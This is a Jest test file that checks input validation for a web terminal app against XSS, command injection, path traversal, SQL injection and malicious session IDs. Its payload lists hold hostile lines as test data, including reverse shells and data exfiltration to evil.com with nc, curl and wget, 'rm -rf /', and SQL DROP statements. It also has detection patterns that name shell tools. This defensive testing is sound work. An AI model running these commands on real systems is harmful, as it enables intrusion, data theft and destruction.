/**
 * Comprehensive Security Tests for Input Validation and Sanitization
 * Tests various attack vectors and security vulnerabilities
 */

describe('Security Input Validation Tests', () => {
  
  describe('XSS Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//',
      '<script>window.location="http://evil.com"</script>',
      '<object data="javascript:alert(\'XSS\')">',
      '<embed src="javascript:alert(\'XSS\')">',
    ];

    test.each(xssPayloads)('should sanitize XSS payload: %s', (payload) => {
      const sanitizeInput = (input: string): string => {
        // Basic XSS prevention
        return input
          .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
          .replace(/<[^>]*>/g, '')
          .replace(/javascript:/gi, '')
          .replace(/on\w+\s*=/gi, '');
      };

      const sanitized = sanitizeInput(payload);
      
      // Should not contain script tags or javascript protocols
      expect(sanitized).not.toMatch(/<script/i);
      expect(sanitized).not.toMatch(/javascript:/i);
      expect(sanitized).not.toMatch(/on\w+\s*=/i);
    });

    test('should handle HTML entities correctly', () => {
      const maliciousInputs = [
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '&quot;&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;',
      ];

      const decodeAndSanitize = (input: string): string => {
        const decoded = input
          .replace(/&lt;/g, '<')
          .replace(/&gt;/g, '>')
          .replace(/&quot;/g, '"')
          .replace(/&#60;/g, '<')
          .replace(/&#62;/g, '>');
        
        return decoded.replace(/<[^>]*>/g, '');
      };

      maliciousInputs.forEach(input => {
        const result = decodeAndSanitize(input);
        expect(result).not.toMatch(/<script/i);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      'ls; rm -rf /',
      'cat /etc/passwd',
      '$(whoami)',
      '`id`',
      '|| wget http://evil.com/malware.sh',
      '; curl -X POST --data-binary @/etc/passwd http://evil.com',
      '& net user hacker password123 /add',
      '| nc evil.com 4444 -e /bin/sh',
      '; python -c "import os; os.system(\'rm -rf /\')"',
      '$(curl http://evil.com/payload.txt | bash)',
    ];

    test.each(commandInjectionPayloads)('should detect command injection: %s', (payload) => {
      const isCommandInjection = (input: string): boolean => {
        const dangerousPatterns = [
          /[;&|`$()]/,  // Shell operators
          /\b(rm|cat|wget|curl|nc|python|bash|sh|powershell|cmd)\b/i,
          /\/etc\/passwd/,
          /\/bin\//,
          /--data-binary/,
          /net\s+user/i,
        ];

        return dangerousPatterns.some(pattern => pattern.test(input));
      };

      expect(isCommandInjection(payload)).toBe(true);
    });

    test('should allow safe terminal commands', () => {
      const safeCommands = [
        'ls -la',
        'pwd',
        'echo "hello world"',
        'cd /home/user',
        'git status',
        'npm install',
        'node --version',
      ];

      const isSafeCommand = (input: string): boolean => {
        // Allow basic commands without dangerous operators
        return !/[;&|`$()]/.test(input) && 
               !/\b(rm|wget|curl|nc|python.*-c|bash.*-c)\b/i.test(input);
      };

      safeCommands.forEach(command => {
        expect(isSafeCommand(command)).toBe(true);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd%00.jpg',
      '....//....//....//etc//passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '..\\..\\..\\etc\\passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....\\....\\....\\etc\\passwd',
      '/var/www/html/../../../etc/passwd',
    ];

    test.each(pathTraversalPayloads)('should detect path traversal: %s', (payload) => {
      const isPathTraversal = (path: string): boolean => {
        const normalizedPath = path.toLowerCase()
          .replace(/%2e/g, '.')
          .replace(/%2f/g, '/')
          .replace(/%5c/g, '\\')
          .replace(/%252e/g, '.')
          .replace(/%252f/g, '/')
          .replace(/\\/g, '/');

        return normalizedPath.includes('../') || 
               normalizedPath.includes('..\\') ||
               normalizedPath.includes('etc/passwd') ||
               normalizedPath.includes('system32');
      };

      expect(isPathTraversal(payload)).toBe(true);
    });

    test('should allow safe file paths', () => {
      const safePaths = [
        '/home/user/documents/file.txt',
        './local/file.js',
        'relative/path/file.json',
        '/usr/local/bin/node',
        'C:\\Users\\user\\Documents\\file.txt',
      ];

      const isSafePath = (path: string): boolean => {
        return !path.includes('../') && 
               !path.includes('..\\') &&
               !path.includes('%2e') &&
               !path.includes('etc/passwd') &&
               !path.includes('system32');
      };

      safePaths.forEach(path => {
        expect(isSafePath(path)).toBe(true);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
      "' OR 1=1 --",
      "\\'; DELETE FROM sessions; --",
      "'; EXEC xp_cmdshell('dir'); --",
      "' UNION SELECT password FROM users WHERE username='admin' --",
      "'; SHUTDOWN; --",
    ];

    test.each(sqlInjectionPayloads)('should detect SQL injection: %s', (payload) => {
      const isSQLInjection = (input: string): boolean => {
        const sqlPatterns = [
          /['";]/,  // Quote characters
          /\b(DROP|DELETE|INSERT|UPDATE|SELECT|UNION|EXEC)\b/i,
          /--/,  // SQL comments
          /\bOR\s+\d+=\d+/i,
          /\bUNION\b/i,
          /\bSHUTDOWN\b/i,
        ];

        return sqlPatterns.some(pattern => pattern.test(input));
      };

      expect(isSQLInjection(payload)).toBe(true);
    });

    test('should parameterize queries safely', () => {
      const sanitizeForQuery = (input: string): string => {
        // Remove dangerous SQL characters and keywords
        return input
          .replace(/['";]/g, '')
          .replace(/\b(DROP|DELETE|INSERT|UPDATE|UNION|EXEC|SHUTDOWN)\b/gi, '')
          .replace(/--/g, '')
          .trim();
      };

      const maliciousInput = "'; DROP TABLE users; --";
      const sanitized = sanitizeForQuery(maliciousInput);
      
      expect(sanitized).not.toMatch(/DROP/i);
      expect(sanitized).not.toMatch(/['";]/);
      expect(sanitized).not.toMatch(/--/);
    });
  });

  describe('Session ID Validation', () => {
    test('should validate session ID format', () => {
      const validateSessionId = (sessionId: string): boolean => {
        // Allow alphanumeric, hyphens, and underscores only
        const validPattern = /^[a-zA-Z0-9_-]+$/;
        const minLength = 8;
        const maxLength = 128;
        
        return validPattern.test(sessionId) && 
               sessionId.length >= minLength && 
               sessionId.length <= maxLength;
      };

      // Valid session IDs
      expect(validateSessionId('session-123')).toBe(true);
      expect(validateSessionId('user_session_abc123')).toBe(true);
      expect(validateSessionId('12345678')).toBe(true);

      // Invalid session IDs
      expect(validateSessionId('session.123')).toBe(false); // Contains dot
      expect(validateSessionId('session 123')).toBe(false); // Contains space
      expect(validateSessionId('session/123')).toBe(false); // Contains slash
      expect(validateSessionId('123')).toBe(false); // Too short
      expect(validateSessionId('x'.repeat(200))).toBe(false); // Too long
    });

    test('should handle malicious session IDs', () => {
      const maliciousSessionIds = [
        '../../../etc/passwd',
        '<script>alert("XSS")</script>',
        '; DROP TABLE sessions; --',
        '${jndi:ldap://evil.com/malware}',
        '{{7*7}}',
        '<%= system("rm -rf /") %>',
      ];

      const isSecureSessionId = (sessionId: string): boolean => {
        return /^[a-zA-Z0-9_-]+$/.test(sessionId) && 
               sessionId.length >= 8 && 
               sessionId.length <= 128;
      };

      maliciousSessionIds.forEach(sessionId => {
        expect(isSecureSessionId(sessionId)).toBe(false);
      });
    });
  });

  describe('Input Size Limits', () => {
    test('should enforce maximum input size', () => {
      const MAX_INPUT_SIZE = 10000; // 10KB
      
      const validateInputSize = (input: string): boolean => {
        return Buffer.byteLength(input, 'utf8') <= MAX_INPUT_SIZE;
      };

      // Valid sizes
      expect(validateInputSize('small input')).toBe(true);
      expect(validateInputSize('x'.repeat(5000))).toBe(true);

      // Invalid sizes
      expect(validateInputSize('x'.repeat(20000))).toBe(false);
    });

    test('should handle Unicode characters in size calculation', () => {
      const validateInputSize = (input: string): boolean => {
        const MAX_SIZE = 1000;
        return Buffer.byteLength(input, 'utf8') <= MAX_SIZE;
      };

      const unicodeString = '🚀'.repeat(200); // Each emoji is 4 bytes
      expect(validateInputSize(unicodeString)).toBe(true);

      const largeUnicodeString = '🚀'.repeat(500); // 2000 bytes
      expect(validateInputSize(largeUnicodeString)).toBe(false);
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    test('should implement basic rate limiting', () => {
      const requests = new Map<string, number[]>();
      const RATE_LIMIT = 10; // 10 requests per minute
      const TIME_WINDOW = 60000; // 1 minute

      const isRateLimited = (clientId: string): boolean => {
        const now = Date.now();
        const clientRequests = requests.get(clientId) || [];
        
        // Remove old requests outside time window
        const recentRequests = clientRequests.filter(time => now - time < TIME_WINDOW);
        
        if (recentRequests.length >= RATE_LIMIT) {
          return true;
        }
        
        recentRequests.push(now);
        requests.set(clientId, recentRequests);
        return false;
      };

      // Simulate requests
      const clientId = 'test-client';
      
      // First 10 requests should pass
      for (let i = 0; i < 10; i++) {
        expect(isRateLimited(clientId)).toBe(false);
      }
      
      // 11th request should be rate limited
      expect(isRateLimited(clientId)).toBe(true);
    });

    test('should handle connection flooding', () => {
      const connections = new Set<string>();
      const MAX_CONNECTIONS = 100;

      const canAcceptConnection = (clientId: string): boolean => {
        if (connections.size >= MAX_CONNECTIONS) {
          return false;
        }
        connections.add(clientId);
        return true;
      };

      // Fill up to max connections
      for (let i = 0; i < MAX_CONNECTIONS; i++) {
        expect(canAcceptConnection(`client-${i}`)).toBe(true);
      }

      // Additional connection should be rejected
      expect(canAcceptConnection('client-overflow')).toBe(false);
    });
  });

  describe('Data Sanitization', () => {
    test('should sanitize terminal output for display', () => {
      const sanitizeTerminalOutput = (output: string): string => {
        // Remove or escape potentially dangerous ANSI sequences
        return output
          .replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '') // Remove ANSI escape sequences
          .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '') // Remove control characters
          .replace(/\x1b\]0;.*?\x07/g, '') // Remove terminal title sequences
          .substring(0, 100000); // Limit output size
      };

      const maliciousOutput = '\x1b]0;evil title\x07\x1b[31mmalicious\x1b[0m\x00\x01\x02';
      const sanitized = sanitizeTerminalOutput(maliciousOutput);
      
      expect(sanitized).toBe('malicious');
      expect(sanitized).not.toMatch(/\x1b/);
      expect(sanitized).not.toMatch(/\x00/);
    });

    test('should validate WebSocket message format', () => {
      const validateMessage = (message: any): boolean => {
        if (typeof message !== 'object' || message === null) {
          return false;
        }

        // Required fields
        if (!message.type || typeof message.type !== 'string') {
          return false;
        }

        // Validate message type
        const validTypes = ['terminal-input', 'terminal-resize', 'session-create'];
        if (!validTypes.includes(message.type)) {
          return false;
        }

        // Validate session ID if present
        if (message.sessionId && !/^[a-zA-Z0-9_-]+$/.test(message.sessionId)) {
          return false;
        }

        return true;
      };

      // Valid messages
      expect(validateMessage({ type: 'terminal-input', sessionId: 'session-123' })).toBe(true);
      expect(validateMessage({ type: 'session-create' })).toBe(true);

      // Invalid messages
      expect(validateMessage(null)).toBe(false);
      expect(validateMessage('string')).toBe(false);
      expect(validateMessage({ type: 'invalid-type' })).toBe(false);
      expect(validateMessage({ type: 'terminal-input', sessionId: '../etc/passwd' })).toBe(false);
    });
  });

  describe('Environment Variable Security', () => {
    test('should sanitize environment variables', () => {
      const sanitizeEnvVar = (value: string): string => {
        // Remove potentially dangerous characters
        return value
          .replace(/[;&|`$()]/g, '')
          .replace(/\.\.\//g, '')
          .trim();
      };

      const maliciousEnvVars = [
        'value; rm -rf /',
        'value && wget http://evil.com',
        'value | nc evil.com 4444',
        '../../../etc/passwd',
      ];

      maliciousEnvVars.forEach(value => {
        const sanitized = sanitizeEnvVar(value);
        expect(sanitized).not.toMatch(/[;&|`$()]/);
        expect(sanitized).not.toMatch(/\.\.\//);
      });
    });

    test('should validate allowed environment variables', () => {
      const allowedEnvVars = [
        'NODE_ENV',
        'PORT',
        'HOST',
        'WS_PORT',
        'NEXT_PUBLIC_WS_URL',
      ];

      const isAllowedEnvVar = (name: string): boolean => {
        return allowedEnvVars.includes(name) && /^[A-Z_]+$/.test(name);
      };

      expect(isAllowedEnvVar('NODE_ENV')).toBe(true);
      expect(isAllowedEnvVar('MALICIOUS_VAR')).toBe(false);
      expect(isAllowedEnvVar('node_env')).toBe(false); // Wrong case
    });
  });
});